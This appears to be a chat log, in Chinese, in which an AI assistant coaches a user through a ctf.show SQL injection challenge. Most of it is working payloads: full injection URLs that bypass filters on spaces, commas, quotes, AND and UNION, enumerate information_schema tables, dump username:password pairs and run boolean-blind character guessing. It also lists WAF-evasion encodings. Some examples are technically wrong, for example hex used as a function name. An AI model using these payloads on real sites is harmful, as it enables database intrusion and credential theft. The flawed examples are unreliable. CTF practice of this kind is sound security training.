    *   替换为 `user()`：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,user(),3#
        ```

4.  **获取表名 (如果数据库是 MySQL/PostgreSQL)：**
    *   利用 `information_schema` 数据库。
    *   例如，获取当前数据库的所有表名：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
        ```
        **注意：** `group_concat()` 函数用于将多行结果合并为一行显示。

5.  **获取列名：**
    *   例如，获取某个表（假设表名为 `users`）的所有列名：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='users'/**/and/**/table_schema=database()#
        ```
        **注意：** 这里我们又遇到了 `AND` 限制。由于 `AND` 不能使用，我们需要替换它。
        *   **替代方案：**
            *   如果 `&&` 可用：`table_name='users'/**/&&/**/table_schema=database()`
            *   如果 `OR` 可用，但逻辑需要 `AND`：这会比较复杂，可能需要子查询或更巧妙的构造。
            *   **更通用的方法：** 尝试使用 `LIKE` 或 `IN` 结合 `CONCAT` 来构造条件，或者利用 `JOIN`。
            *   **例如，使用 `LIKE` 模拟 `AND`：**
                ```
                http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'users'/**/or/**/table_schema/**/like/**/database()#
                ```
                这并不是严格的 `AND` 逻辑，但可以尝试。

#### 步骤五：获取数据

一旦获取了表名和列名，就可以提取数据了。

1.  **例如，从 `users` 表中获取 `username` 和 `password` 列的数据：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(username,0x3a,password),3/**/from/**/users#
    ```
    *   `0x3a` 是冒号 `:` 的十六进制表示，用于分隔用户名和密码，使其更易读。

### 总结

您当前遇到的主要问题是 `UNION SELECT` 的列数不匹配。一旦解决了这个问题，并利用 `/**/` 绕过空格限制，以及找到 `AND` 的替代方案，您就可以继续进行信息收集和数据提取了。

**关键点：**

*   **确定列数** (使用 `ORDER BY` 或 `UNION SELECT` 逐一尝试)。
*   **利用 `id=-1`** 使原始查询不返回结果，以便 `UNION SELECT` 的结果能够显示。
*   **利用 `group_concat()`** 合并多行结果，方便一次性获取更多信息。
*   **灵活运用 `/**/`** 绕过空格。
*   **寻找 `AND` 的替代方案** (如 `&&` 或其他逻辑操作符)。

祝您注入顺利！
        






          
您好！了解到您已经确定了列数为 3，并且发现逗号 (`,`) 关键字被限制不能使用，这确实是一个常见的 SQL 注入绕过挑战。逗号在 `UNION SELECT` 语句中用于分隔不同的列，如果被限制，我们需要寻找替代方法。

下面我将为您详细介绍几种绕过逗号限制的方法，并结合您的场景（3 列）进行说明。

### 绕过逗号 (`,`) 限制的方法

#### 方法一：使用 `JOIN` 语句 (适用于 MySQL)

在 MySQL 中，`JOIN` 语句可以用于连接多个表，并且在 `SELECT` 语句中，我们可以通过 `JOIN` 来选择多个列，而无需直接使用逗号分隔。这种方法通常用于从 `information_schema` 中提取数据。

**原理：**
通过 `JOIN` 语句将多个 `SELECT` 语句的结果连接起来，每个 `SELECT` 语句只选择一个列，从而避免在单个 `SELECT` 语句中使用逗号。

**示例 (假设您要获取数据库名、表名和列名)：**

1.  **确定可回显的列：**
    您已经知道有 3 列。假设通过之前的测试，您发现第 2 列和第 3 列是可回显的。

2.  **构造 `UNION SELECT` 语句，利用 `JOIN` 提取数据：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,a.schema_name,b.table_name/**/from/**/information_schema.schemata/**/a/**/join/**/information_schema.tables/**/b/**/on/**/a.schema_name=b.table_schema/**/limit/**/0,1#
    ```
    **解释：**
    *   `id=-1`：使原始查询不返回结果。
    *   `unio/**/n/**/select/**/1,a.schema_name,b.table_name`：`UNION SELECT` 语句，选择 3 列。
    *   `a.schema_name`：从 `information_schema.schemata` 表中选择 `schema_name` 列，并将其别名为 `a`。
    *   `b.table_name`：从 `information_schema.tables` 表中选择 `table_name` 列，并将其别名为 `b`。
    *   `from/**/information_schema.schemata/**/a/**/join/**/information_schema.tables/**/b/**/on/**/a.schema_name=b.table_schema`：通过 `JOIN` 连接 `schemata` 和 `tables` 表。
    *   `limit/**/0,1`：限制只返回一条结果，避免一次性返回过多数据导致页面混乱或再次触发过滤。您可以通过修改 `limit` 的偏移量 (`0`) 来逐条获取数据。

**优点：**
*   在某些数据库（如 MySQL）中非常有效，可以绕过 `SELECT` 列表中的逗号限制。
*   可以灵活地提取多个数据项。

**缺点：**
*   依赖于数据库类型，并非所有数据库都支持这种 `JOIN` 语法或 `information_schema`。
*   构造起来相对复杂。

#### 方法二：使用 `SUBSTRING` 和 `CONCAT` 结合 `GROUP_CONCAT` (如果 `GROUP_CONCAT` 可用)

如果逗号限制仅限于 `UNION SELECT` 的列分隔，而 `GROUP_CONCAT` 函数内部的逗号分隔符没有被限制，那么我们可以利用 `GROUP_CONCAT` 将多个值连接成一个字符串，然后通过 `SUBSTRING` 逐个提取。

**原理：**
`GROUP_CONCAT()` 函数可以将查询结果中的多行数据连接成一个字符串，并使用指定的分隔符（默认为逗号）。如果 `GROUP_CONCAT` 内部的逗号没有被过滤，我们可以用它来组合信息。

**示例 (假设您要获取数据库名和表名，并将其显示在一个可回显的列中)：**

1.  **获取数据库名和表名，并用 `GROUP_CONCAT` 连接：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(schema_name,0x3a,table_name),3/**/from/**/information_schema.tables#
    ```
    **解释：**
    *   `group_concat(schema_name,0x3a,table_name)`：将 `schema_name` 和 `table_name` 连接起来，中间用 `:` (0x3a) 分隔。
    *   这样，所有数据库名和表名都会在一个可回显的列中显示，例如 `db1:table1,db1:table2,db2:table3`。

2.  **如果 `GROUP_CONCAT` 内部的逗号也被过滤：**
    *   您可以尝试使用其他字符作为 `GROUP_CONCAT` 的分隔符，例如 `group_concat(schema_name,0x3a,table_name/**/separator/**/0x7c)` (使用 `|` 作为分隔符)。

**优点：**
*   可以将大量信息集中在一个可回显的列中。
*   在某些情况下可以绕过 `SELECT` 列表中的逗号限制。

**缺点：**
*   依赖于 `GROUP_CONCAT` 函数的可用性。
*   如果 `GROUP_CONCAT` 内部的分隔符也被过滤，则需要进一步绕过。
*   一次性获取的数据量可能很大，需要进一步解析。

#### 方法三：使用 `CASE` 语句或 `IF` 语句 (逐个字符提取)

如果上述方法都不可行，或者您只能回显一个列，那么可以退回到盲注的思路，通过 `CASE` 或 `IF` 语句逐个字符地提取信息。

**原理：**
通过构造条件判断，在可回显的列中显示不同的值，从而判断某个字符是否正确。这本质上是布尔盲注或时间盲注的变种，但利用了可回显的列。

**示例 (假设第 2 列可回显，您要获取数据库名的第一个字符)：**

```
http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,case/**/when/**/substring(database(),1,1)='a'/**/then/**/1/**/else/**/0/**/end,3#
```
**解释：**
*   `case/**/when/**/substring(database(),1,1)='a'/**/then/**/1/**/else/**/0/**/end`：如果数据库名的第一个字符是 'a'，则在第 2 列显示 1，否则显示 0。
*   您需要不断修改 `substring()` 的位置和猜测的字符，直到找到正确的值。

**优点：**
*   在极端过滤情况下仍然有效。
*   不依赖于逗号分隔多列。

**缺点：**
*   效率极低，需要大量的请求。
*   自动化程度低，手动操作非常繁琐。

#### 方法四：使用 `UNION ALL SELECT` 结合子查询 (如果 `FROM` 子句中的逗号未被限制)

在某些情况下，如果 `SELECT` 列表中的逗号被限制，但 `FROM` 子句中的逗号（用于连接表）没有被限制，可以尝试使用子查询。

**原理：**
通过子查询构造多个单列的 `SELECT` 语句，然后将这些子查询的结果作为虚拟表进行 `JOIN`，从而在外部 `SELECT` 中选择多个列。

**示例 (假设列数为 3)：**

```
http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/a.col1,b.col2,c.col3/**/from/**/(select/**/1/**/as/**/col1)/**/a,/**/(select/**/2/**/as/**/col2)/**/b,/**/(select/**/3/**/as/**/col3)/**/c#
```
**解释：**
*   `(select/**/1/**/as/**/col1)/**/a`：这是一个子查询，选择数字 1，并将其别名为 `col1`，整个子查询结果作为一个虚拟表 `a`。
*   `from/**/(select/**/1/**/as/**/col1)/**/a,/**/(select/**/2/**/as/**/col2)/**/b,/**/(select/**/3/**/as/**/col3)/**/c`：通过逗号分隔的多个子查询，它们之间会进行笛卡尔积连接。
*   `select/**/a.col1,b.col2,c.col3`：从这些虚拟表中选择对应的列。

**优点：**
*   可以绕过 `SELECT` 列表中的逗号限制。
*   相对灵活。

**缺点：**
*   依赖于 `FROM` 子句中逗号的可用性。
*   构造起来比较复杂。

### 针对您的场景的建议步骤

1.  **再次确认列数：** 尽管您已经发现列数为 3，但为了确保万无一失，可以再次使用 `ORDER BY` 确认。
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/order/**/by/**/3#  (如果正常)
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/order/**/by/**/4#  (如果报错，则列数为 3)
    ```

2.  **尝试方法一 (`JOIN` 语句)：**
    这是在 MySQL 环境下绕过逗号限制提取多列信息最常用的方法之一。
    *   首先，尝试识别可回显的列。例如，如果第 2 列和第 3 列可回显，您可以尝试：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,a.schema_name,b.table_name/**/from/**/information_schema.schemata/**/a/**/join/**/information_schema.tables/**/b/**/on/**/a.schema_name=b.table_schema/**/limit/**/0,1#
        ```
    *   如果页面显示了数据库名和表名，那么这种方法是可行的。

3.  **尝试方法二 (`GROUP_CONCAT`)：**
    如果 `JOIN` 语句过于复杂或不适用，可以尝试 `GROUP_CONCAT` 将信息集中在一个可回显的列中。
    *   例如，获取所有数据库名：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,group_concat(schema_name),3/**/from/**/information_schema.schemata#
        ```
    *   如果 `GROUP_CONCAT` 内部的逗号分隔符也被过滤，可以尝试指定其他分隔符，例如 `group_concat(schema_name/**/separator/**/0x7c)`。

4.  **如果上述方法都失败，考虑使用 sqlmap：**
    sqlmap 拥有大量的 tamper 脚本，其中一些可能专门用于绕过逗号限制。您可以尝试使用 `--tamper` 选项，并结合 `--batch` 和 `-v 3` 来观察 sqlmap 如何构造 payload。
    *   例如，尝试一些通用的编码 tamper，或者查看是否有针对逗号的 tamper。

**重要提示：**
*   在每次尝试新的 payload 后，务必仔细观察页面的响应，包括错误信息、页面内容变化、HTTP 状态码等，这些都是判断 payload 是否有效的重要依据。
*   由于 `AND` 关键字也被限制，您在构造条件时需要使用 `OR` 或其他替代方式。
*   请确保您在合法授权下进行测试。

希望这些方法能帮助您成功绕过逗号限制并完成注入！

---

Trae
异常打断


您好！针对SQL注入中过滤了引号、逗号、空格、AND和UNION关键字的情况，我将为您提供详细的解题思路、多种绕过方案以及具体的URL构造示例。

这种过滤通常是为了防御常见的SQL注入攻击，但我们可以通过一些编码和替代方法来绕过这些限制，实现盲注（Blind SQL Injection）。

核心思路：盲注
由于UNION关键字被过滤，我们无法使用UNION SELECT进行联合查询注入来直接获取数据。因此，我们需要采用盲注技术。盲注分为两种主要类型：

1.
布尔盲注 (Boolean-based Blind Injection)：通过观察页面返回的布尔值（真/假，例如页面正常/异常，或显示不同内容）来判断注入语句的条件是否成立，从而逐位猜测数据。
2.
时间盲注 (Time-based Blind Injection)：通过注入特定的延时函数（如SLEEP()），根据页面响应时间来判断注入语句的条件是否成立。当布尔盲注无法区分页面差异时，时间盲注是一个有效的备选方案。
我们将主要以布尔盲注为例进行讲解，并在最后提供时间盲注的思路。

通用绕过技巧
在构造URL之前，我们先了解如何绕过这些被过滤的字符和关键字：

1. 绕过引号 (' 和 ")
当引号被过滤时，我们无法直接使用字符串。

方案一：十六进制编码 (Hex Encoding)
原理：将字符串转换为其十六进制表示，数据库通常支持识别0x开头的十六进制字符串。
示例：'admin' 可以表示为 0x61646d696e。
优劣：
优点：通用性强，许多数据库都支持。
缺点：手动转换较繁琐，但有工具可以辅助。
方案二：CHAR() 函数
原理：通过ASCII码值来构建字符。
示例：'a' 可以表示为 CHAR(97)。'admin' 可以表示为 CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)) (如果CONCAT和逗号没被过滤，但这里逗号被过滤了，所以需要更复杂的拼接)。
优劣：
优点：不需要引号。
缺点：需要知道每个字符的ASCII码，且如果CONCAT和逗号被过滤，拼接长字符串会很复杂。在我们的场景中，由于逗号被过滤，此方法用于拼接字符串会比较困难，但用于单个字符的比较仍然可行。
2. 绕过逗号 (,)
逗号在SQL中常用于函数参数分隔、LIMIT子句等。

方案一：SUBSTRING(string FROM start FOR length) 或 MID(string FROM start FOR length)
原理：这是MySQL和PostgreSQL中SUBSTRING和MID函数的另一种语法，使用FROM和FOR关键字替代逗号。
示例：SUBSTRING('abc', 1, 1) 变为 SUBSTRING('abc' FROM 1 FOR 1)。
优劣：
优点：直接有效，是绕过逗号最常用的方法之一。
缺点：并非所有数据库都支持这种语法（例如SQL Server）。
方案二：LIMIT offset 1
原理：在LIMIT子句中，LIMIT N, M 可以替换为 LIMIT M OFFSET N。
示例：LIMIT 0, 1 变为 LIMIT 1 OFFSET 0。
优劣：
优点：在需要限制结果集时非常有用。
缺点：仅适用于LIMIT子句。
3. 绕过空格 ( )
空格是SQL语句中必不可少的分隔符。

方案一：多行注释 /**/
原理：数据库会将多行注释视为一个空格。
示例：SELECT/**/user()。
优劣：
优点：非常常用且兼容性好。
缺点：某些WAF可能会识别并过滤。
方案二：URL编码的空白字符
原理：使用URL编码的换行符、制表符等来代替空格。
示例：%0a (换行符), %0b (垂直制表符), %0c (换页符), %0d (回车符), %09 (水平制表符)。
优劣：
优点：可以绕过一些简单的空格过滤。
缺点：兼容性不如/**/，且可能被WAF识别。
方案三：括号 ()
原理：在某些情况下，括号可以起到分隔作用。
示例：SELECT(user())。
优劣：
优点：在特定语境下有效。
缺点：适用范围有限。
4. 绕过 AND 关键字
AND用于连接多个条件。

方案一：逻辑与符号 &&
原理：在MySQL等数据库中，&&与AND具有相同的逻辑功能。
示例：1=1/**/&&/**/2=2。
优劣：
优点：简洁有效，是AND最常见的替代。
缺点：并非所有数据库都支持&&（例如SQL Server不支持）。
方案二：OR 结合 NOT
原理：A AND B 等价于 NOT (NOT A OR NOT B)。
示例：NOT(NOT(1=1)/**/OR/**/NOT(2=2))。
优劣：
优点：逻辑上等价，可以绕过对AND的直接过滤。
缺点：语句复杂，容易出错，且需要OR和NOT未被过滤。
方案三：WHERE 子句中的多条件
原理：某些数据库在WHERE子句中允许直接列出多个条件而无需AND连接（不常见，且通常需要特定配置）。
示例：WHERE a=1 b=2。
优劣：
输出过长，请输入“继续”后获得更多结果。
asd1054
复制
删除
继续
Trae
好的，我们继续讨论在SQL注入中，当引号、逗号、空格、and 和 union 被过滤时，如何进行编码或通过其他方法绕过这些限制，并构造具体的URL注入payload。

这些过滤通常是为了防止常见的SQL注入攻击，但我们可以利用SQL语法的一些特性和URL编码来绕过它们。

绕过思路和具体构造URL
我们将针对每种被过滤的字符或关键字，提供多种绕过方法，并最终组合成一个完整的URL注入payload。假设目标URL为 http://example.com/product?id=1，我们将在这个 id 参数后拼接注入语句。

1. 绕过空格 (Space)
空格是最常见的过滤对象之一。

绕过方法：

多行注释 /**/
原理： 在SQL中，/**/ 被视为注释，但数据库解析器会将其识别为空格。
优点： 兼容性好，在多种数据库中有效。
缺点： 可能会被更严格的WAF（Web Application Firewall）识别并过滤。
URL编码： /*%2A%2F (因为 / 和 * 在URL中不需要编码，但为了统一，有时也会编码)
示例： SELECT/**/user()
括号 ()
原理： 在某些函数调用或表达式中，括号可以起到分隔作用，间接替代空格。例如，sleep(5) 中的 sleep 和 5 之间没有空格。
优点： 简单有效。
缺点： 适用场景有限，不能完全替代所有空格。
URL编码： () 不需要编码。
示例： SELECT(user())
特殊字符作为空格 (如 %0a, %0b, %0c, %0d, %09)
原理： 这些是URL编码后的换行符、垂直制表符、换页符、回车符和水平制表符。在某些数据库中，它们可以被解释为空格。
优点： 隐蔽性较好，WAF可能不会直接过滤这些字符。
缺点： 兼容性不如 /**/，不同数据库支持情况不同。
URL编码： %0a (换行), %0b (垂直制表), %0c (换页), %0d (回车), %09 (制表符)。
示例： SELECT%0auser()
加号 + 或 %20
原理： 在URL中，+ 和 %20 都代表空格。但如果空格被过滤，通常这些也会被过滤。
优点： 标准的URL空格表示。
缺点： 极易被过滤。
URL编码： + 或 %20。
示例： SELECT+user()
2. 绕过引号 (Quotes)
引号通常用于字符串，过滤引号会使得构造字符串变得困难。

绕过方法：

十六进制编码 (Hex Encoding)
原理： 将字符串转换为十六进制表示，数据库通常支持 0x 前缀的十六进制字符串。
优点： 兼容性好，非常有效。
缺点： 编码后的字符串较长。
URL编码： 0x 不需要编码，十六进制字符也不需要。
示例： SELECT/**/0x75736572() (0x75736572 是 'user' 的十六进制)
CHAR() 函数
原理： 通过 CHAR() 函数将ASCII码转换为字符，然后拼接起来。
优点： 绕过引号，适用于无法使用十六进制的场景。
缺点： 构造复杂，需要知道每个字符的ASCII码，且需要绕过逗号。
URL编码： CHAR() 不需要编码。
示例： SELECT/**/CHAR(117,115,101,114) (需要绕过逗号)
CONCAT() 函数
原理： 使用 CONCAT() 函数拼接字符串，如果能绕过逗号和引号，可以构造复杂的字符串。
优点： 灵活。
缺点： 需要绕过逗号和引号。
URL编码： CONCAT() 不需要编码。
示例： SELECT/**/CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114)) (需要绕过逗号)
3. 绕过逗号 (Comma)
逗号在函数参数、UNION SELECT 语句中非常常见。

绕过方法：

FROM 关键字 (针对 SUBSTR() 或 MID() 函数)
原理： 在MySQL中，SUBSTR() 和 MID() 函数除了使用逗号分隔参数外，还可以使用 FROM ... FOR ... 语法。
优点： 针对性强，非常有效。
缺点： 仅适用于 SUBSTR() 和 MID() 函数，且仅限于MySQL。
URL编码： FROM 和 FOR 不需要编码。
示例： SUBSTR(database()/**/FROM/**/1/**/FOR/**/1)
OFFSET 和 LIMIT (针对 UNION SELECT 中的列)
原理： 在某些情况下，可以通过 LIMIT 0,1 或 LIMIT 1 OFFSET 0 来选择第一行数据，避免使用逗号。但这通常用于 UNION SELECT 后的子查询，而不是直接替换 UNION SELECT 中的列分隔符。
优点： 适用于某些特定的数据检索场景。
缺点： 无法直接替代 UNION SELECT 中的逗号。
URL编码： OFFSET 和 LIMIT 不需要编码。
JOIN 关键字 (针对多表查询)
原理： 在多表查询中，可以使用 JOIN 替代逗号来连接表。
优点： 标准SQL语法。
缺点： 仅适用于表连接，不能替代函数参数中的逗号。
URL编码： JOIN 不需要编码。
4. 绕过 AND 和 UNION 关键字
这两个关键字是布尔盲注和联合查询注入的核心，被过滤后需要寻找替代方案。

绕过方法：

逻辑运算符替代 AND
原理： 使用 && (逻辑与) 替代 AND。
优点： 简单有效，在MySQL中常用。
缺点： 兼容性不如 AND，其他数据库可能不支持。
URL编码： && 不需要编码。
示例： id=1/**/&&/**/1=1
内联注释绕过 UNION
原理： 在关键字中间插入注释，数据库解析器会忽略注释，但WAF可能无法识别。
优点： 隐蔽性较好。
缺点： 并非所有WAF都能绕过。
URL编码： UNION%2F%2A%2A%2FSELECT (即 UNION/**/SELECT)
示例： id=1/**/UNION/**/SELECT/**/1,2,3
大小写混淆
原理： 尝试使用 union、Union、uNiOn 等大小写组合。
优点： 最简单的绕过方式，有时有效。
缺点： 现代WAF通常会进行大小写不敏感匹配。
URL编码： 不需要特殊编码。
示例： id=1/**/UnIoN/**/SeLeCt/**/1,2,3
编码绕过 (URL编码、双重URL编码)
原理： 对关键字进行URL编码，甚至双重URL编码，期望WAF只解码一次。
优点： 可能会绕过一些简单的WAF。
缺点： 成功率不高，现代WAF通常会进行多次解码。
URL编码： UNION 编码为 %55%4E%49%4F%4E。
示例： id=1/**/%55%4E%49%4F%4E/**/SELECT/**/1,2,3
OR 替代 AND
原理： 如果 AND 被过滤但 OR 没有，可以尝试使用 OR 构造条件。但这会改变逻辑，需要根据具体情况调整。
优点： 如果 OR 未被过滤，是一种选择。
缺点： 逻辑不同，需要重新设计注入语句。
URL编码： OR 不需要编码。
示例： id=1/**/OR/**/1=1
综合示例：盲注获取数据库名
假设我们想通过布尔盲注来获取数据库名的第一个字符，并且引号、逗号、空格、and、union 都被过滤。

目标： 猜测数据库名的第一个字符是否为 'a'。 原始语句 (如果未过滤)： id=1 AND SUBSTR(DATABASE(),1,1)='a'

绕过后的URL构造步骤：

1.
绕过空格： 使用 /**/
2.
绕过引号： 使用十六进制编码 0x61 (代表 'a')
3.
绕过逗号： 使用 FROM ... FOR ... 语法
4.
绕过 AND： 使用 &&
最终构造的URL Payload：

PlainText



http://example.com/product?id=1/**/&&/**/SUBSTR(DATABASE()/**/FROM/**/1/**/FOR/**/1)=0x61
详细解释：

id=1：原始查询条件。
/**/：替代空格。
&&：替代 AND 关键字。
SUBSTR(DATABASE()/**/FROM/**/1/**/FOR/**/1)：
DATABASE()：获取当前数据库名。
/**/：替代 DATABASE() 和 FROM 之间的空格。
FROM/**/1/**/FOR/**/1：替代 1,1，表示从第一个字符开始，取一个字符。
=0x61：替代 ='a'，使用十六进制编码绕过引号。
如何判断成功：

如果页面返回正常（与 id=1 时的页面一致），说明猜测正确，数据库名的第一个字符是 'a'。
如果页面返回异常（如空白页、错误页或与 id=1 AND 1=2 时的页面一致），说明猜测错误。
通过这种方式，我们可以逐位猜测数据库名的每个字符，直到获取完整的数据库名。

总结与建议
多种方案尝试： 针对每种过滤，都有多种绕过方法。在实际测试中，需要逐一尝试，因为不同的WAF和数据库配置会有不同的过滤规则。
URL编码： 所有的特殊字符和空格都需要进行URL编码，例如空格是 %20 或 +，但我们这里使用了 /**/ 或 %0a 等更隐蔽的方式。
数据库特性： 了解目标数据库的特性非常重要。例如，FROM ... FOR ... 语法主要在MySQL中有效。
盲注是常态： 当过滤严格时，通常只能进行盲注（布尔盲注或时间盲注），因为无法直接获取数据。
自动化工具： 在实际渗透测试中，通常会使用SQLMap等自动化工具来尝试各种绕过技术，提高效率。但在手工测试时，理解这些原理是基础。
错误处理： 在构造注入语句时，要时刻关注页面的返回，判断注入是否成功，以及是否触发了数据库错误。
希望这些详细的解释和URL构造示例能帮助你理解和解决SQL注入中过滤引号、逗号、空格和 and、union 的问题。